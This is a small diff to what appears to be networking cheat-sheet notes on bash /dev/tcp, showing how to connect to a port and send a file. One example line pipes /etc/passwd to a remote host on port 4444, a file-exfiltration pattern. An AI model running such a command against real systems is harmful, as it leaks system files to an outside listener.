@@ -36,7 +36,8 @@ https://learn.microsoft.com/en-us/windows-server/networking/technologies/pktmon/
 Connect to a port: echo "" > /dev/tcp/142.250.138.139/443
 
 Send a file: cat /path/to/file > /dev/tcp/ip/port
-  ex: cat /etc/passwd > /dev/tcp/10.10.10.10/4444
+
+- ex: cat /etc/passwd > /dev/tcp/10.10.10.10/4444
 
 ### All the cats
 
